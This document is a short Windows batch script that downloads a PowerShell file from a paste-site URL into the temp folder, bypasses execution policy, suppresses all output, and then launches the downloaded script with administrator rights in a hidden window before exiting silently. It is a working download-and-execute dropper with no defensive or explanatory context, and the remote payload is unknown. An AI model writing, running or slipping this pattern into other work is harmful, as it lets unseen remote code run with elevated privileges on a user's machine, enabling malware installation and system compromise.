@echo off
setlocal

REM Set the URL of the script file
set "scriptUrl=https://paste.fo/raw/6b15b7f29a97"

REM Set the name of the downloaded script file
set "scriptFile=%temp%\script.ps1"

REM Download the script file using PowerShell
powershell.exe -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri \"%scriptUrl%\" -OutFile \"%scriptFile%\"}" >nul 2>&1

REM Wait for the download to complete
:wait_for_download
if not exist "%scriptFile%" (
    timeout /t 1 /nobreak >nul
    goto :wait_for_download
)

REM Run the script file as administrator with hidden console
powershell.exe -ExecutionPolicy Bypass -Command "& {Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%scriptFile%\"' -Verb RunAs -WindowStyle Hidden}" >nul 2>&1

REM Close the console window silently
exit